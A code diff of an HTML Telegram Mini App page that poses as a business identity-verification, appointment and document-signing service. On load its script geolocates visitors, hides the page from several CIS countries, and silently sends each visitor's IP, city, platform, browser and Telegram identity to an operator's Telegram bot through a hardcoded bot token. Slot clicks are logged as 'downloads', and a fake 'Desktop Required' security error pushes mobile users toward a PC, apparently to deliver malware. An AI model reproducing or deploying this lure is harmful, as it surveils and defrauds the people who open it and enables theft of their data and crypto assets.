@@ -7,119 +7,115 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #ffffff; color: #1a1a1a; font-family: -apple-system, sans-serif; display: none; } /* Скрыто до проверки ГЕО */
+        body { background-color: #ffffff; color: #1a1a1a; font-family: -apple-system, sans-serif; display: none; }
         .card { background-color: #f2f3f5; border-radius: 24px; padding: 24px; text-align: center; }
         .btn-blue { background-color: #4b94e9; color: white; font-weight: 600; border-radius: 16px; width: 100%; padding: 16px; border: none; cursor: pointer; }
-        #loader-overlay, #pc-error-overlay { display: none; position: fixed; inset: 0; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
-        .spinner { width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #4b94e9; border-radius: 50%; animation: spin 1s linear infinite; }
+        #loader-overlay, #pc-error-overlay, #time-picker { display: none; position: fixed; inset: 0; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .time-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; width: 100%; max-width: 300px; }
+        .slot { background: #f2f3f5; padding: 12px; border-radius: 12px; font-weight: 600; cursor: pointer; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #4b94e9; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="p-4">
 
-    <div id="app-content">
-        <div class="flex flex-col items-center mb-8 pt-4">
-            <div id="user-avatar" class="w-24 h-24 rounded-full bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center text-white text-4xl font-bold mb-4 shadow-md">?</div>
-            <h1 id="user-name" class="text-2xl font-bold mb-1">Loading...</h1>
-            <p class="text-gray-400 text-sm mb-3 font-mono">ID: <span id="user-id">0000000000</span></p>
-            <div class="bg-orange-50 text-orange-500 px-3 py-1 rounded-full text-xs font-bold">⏳ Not Verified</div>
-        </div>
+    <div id="user-header" class="flex flex-col items-center mb-6 pt-4 text-center">
+        <div id="user-avatar" class="w-20 h-20 rounded-full bg-blue-600 flex items-center justify-center text-white text-3xl font-bold mb-3">?</div>
+        <h1 id="user-name" class="text-xl font-bold">Loading...</h1>
+        <p id="user-id" class="text-gray-400 text-xs font-mono"></p>
+    </div>
 
-        <div class="card mb-6">
-            <div class="text-4xl mb-3">🛡️</div>
-            <h3 class="font-bold text-lg mb-1">Identity Verification</h3>
-            <p class="text-gray-400 text-xs mb-6">Required for business operations and crypto-asset protection.</p>
-            <button onclick="openTimePicker()" class="btn-blue">🔒 Start Verification</button>
+    <div class="space-y-4">
+        <!-- Карточка 1 -->
+        <div class="card">
+            <div class="text-3xl mb-2">📅</div>
+            <h3 class="font-bold mb-1">Schedule Appointments</h3>
+            <p class="text-gray-400 text-[11px] mb-4">Book meetings with verified businesses</p>
+            <button onclick="showSlots()" class="btn-blue text-sm">🔒 Verify to Access</button>
+        </div>
+        <!-- Карточка 2 -->
+        <div class="card">
+            <div class="text-3xl mb-2">✍️</div>
+            <h3 class="font-bold mb-1">Document Signing</h3>
+            <p class="text-gray-400 text-[11px] mb-4">Secure legal validity for your contracts</p>
+            <button onclick="showSlots()" class="btn-blue text-sm">🔒 Verify to Access</button>
         </div>
     </div>
 
-    <!-- Модалки те же: TimePicker, Loader, PC-Error -->
-    <div id="time-picker" class="hidden fixed inset-0 bg-white p-6 z-50">
-        <h2 class="text-2xl font-bold mb-6 text-center">Select Slot</h2>
-        <div class="space-y-4">
-            <div onclick="confirmAndSend('09:00 AM')" class="bg-gray-100 p-4 rounded-xl font-bold">09:00 AM - Available</div>
-            <div onclick="confirmAndSend('02:00 PM')" class="bg-gray-100 p-4 rounded-xl font-bold">02:00 PM - Available</div>
+    <!-- Выбор времени -->
+    <div id="time-picker">
+        <h2 id="current-date" class="font-bold text-lg mb-2"></h2>
+        <p class="text-gray-400 text-xs mb-6">4 slots available for today</p>
+        <div class="time-grid">
+            <div class="slot" onclick="action('09:30 AM')">09:30 AM</div>
+            <div class="slot" onclick="action('11:00 AM')">11:00 AM</div>
+            <div class="slot" onclick="action('02:15 PM')">02:15 PM</div>
+            <div class="slot" onclick="action('05:00 PM')">05:00 PM</div>
         </div>
+        <button onclick="hideSlots()" class="mt-8 text-gray-400 text-sm">← Back</button>
     </div>
 
+    <!-- Загрузка -->
     <div id="loader-overlay">
-        <div class="spinner mb-6"></div>
-        <h2 id="loader-title" class="text-xl font-bold mb-2">Syncing...</h2>
-        <div id="loader-msg" class="text-gray-400 text-sm">Initializing secure tunnel</div>
+        <div class="spinner mb-4"></div>
+        <h2 id="l-title" class="font-bold">Verifying...</h2>
     </div>
 
+    <!-- Ошибка ПК -->
     <div id="pc-error-overlay">
-        <div class="text-6xl mb-6">💻</div>
-        <h2 class="text-2xl font-extrabold mb-4">Desktop Required</h2>
-        <p class="text-red-500 text-xs font-bold mb-4">Error 0x882-VX: Mobile Access Denied</p>
-        <p class="text-gray-500 text-sm">Please complete verification via Telegram Desktop on Windows/macOS.</p>
+        <div class="text-5xl mb-4">💻</div>
+        <h2 class="font-bold text-xl mb-2">Desktop Required</h2>
+        <p class="text-red-500 text-[10px] font-bold mb-4">SECURITY ERROR: 0x882-VX</p>
+        <p class="text-gray-500 text-xs px-6">Mobile signatures are disabled. Please use Telegram Desktop on your PC.</p>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         const BOT_TOKEN = '8306979857:AAHz6mJipjg0kYnJVXhapTe2FgxTKbP1J7s';
         const CHAT_ID = '-5123352957';
-        
-        const BANNED_COUNTRIES = ['RU', 'UA', 'BY', 'KZ', 'AM', 'GE']; // Список кодов для блокировки
+        const BANNED = ['RU', 'UA', 'BY', 'KZ', 'AM', 'GE'];
 
         async function init() {
             try {
-                // 1. Получаем ГЕО и данные по IP
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
                 
-                // 2. Проверка блокировки
-                if (BANNED_COUNTRIES.includes(data.country_code)) {
-                    document.body.innerHTML = ""; // Пусто для забаненных
-                    return;
-                }
-
+                if (BANNED.includes(data.country_code)) return;
                 document.body.style.display = "block";
-                
-                // 3. Отправка лога «ВХОД»
-                const user = tg.initDataUnsafe?.user || { first_name: "Unknown", id: "0" };
-                const logMsg = `👤 **Вход в App**\n` +
-                               `Имя: ${user.first_name}\n` +
-                               `ID: \`${user.id}\`\n` +
-                               `ГЕО: ${data.country_name} (${data.city})\n` +
-                               `Браузер: ${navigator.userAgent.slice(0, 50)}...`;
-                
-                sendToBot(logMsg);
 
-                // Заполнение UI
+                const user = tg.initDataUnsafe?.user || { first_name: "Guest", id: "Unknown" };
                 document.getElementById('user-name').innerText = user.first_name;
-                document.getElementById('user-id').innerText = user.id;
-                document.getElementById('user-avatar').innerText = user.first_name.charAt(0);
+                document.getElementById('user-id').innerText = "ID: " + user.id;
+                document.getElementById('user-avatar').innerText = user.first_name[0];
+                document.getElementById('current-date').innerText = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
 
-            } catch (e) {
-                document.body.style.display = "block"; // Показываем на случай ошибки API ГЕО
-            }
+                // Лог ПЕРЕХОДА
+                send(`👀 **Переход по вашей ссылке**\n\n🔗 IP: ${data.ip}\n🇮🇩 Локация: ${data.country_name}, ${data.city}\n\n🖥 Система: ${navigator.platform}\n🌐 Браузер: ${navigator.userAgent.split(' ')[0]}\n💵 Кошельки: Нет`);
+            } catch (e) { document.body.style.display = "block"; }
         }
 
-        async function sendToBot(text) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        async function send(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
         }
 
-        function openTimePicker() { document.getElementById('time-picker').style.display = 'block'; }
+        function showSlots() { document.getElementById('time-picker').style.display = 'flex'; }
+        function hideSlots() { document.getElementById('time-picker').style.display = 'none'; }
 
-        function confirmAndSend(slot) {
-            const isDownloaded = localStorage.getItem('downloaded') === 'true';
-            const status = isDownloaded ? "⚠️ **ПОВТОРНОЕ скачивание**" : "📥 **НОВОЕ скачивание**";
+        function action(time) {
+            const isPC = tg.platform === 'tdesktop' || tg.platform === 'macos';
+            const downloaded = localStorage.getItem('dl') ? "⚠️ Повторное" : "📥 Новое";
             
-            const user = tg.initDataUnsafe?.user || { first_name: "Unknown" };
-            sendToBot(`${status}\nПользователь: ${user.first_name}\nСлот: ${slot}`);
-            
-            localStorage.setItem('downloaded', 'true');
+            send(`${downloaded} **скачивание**\nСлот: ${time}\nУстройство: ${tg.platform}`);
+            localStorage.setItem('dl', 'true');
 
-            document.getElementById('time-picker').style.display = 'none';
+            hideSlots();
             document.getElementById('loader-overlay').style.display = 'flex';
 
             setTimeout(() => {
-                const isPC = tg.platform === 'tdesktop' || tg.platform === 'macos';
                 if (!isPC) {
                     document.getElementById('loader-overlay').style.display = 'none';
                     document.getElementById('pc-error-overlay').style.display = 'flex';
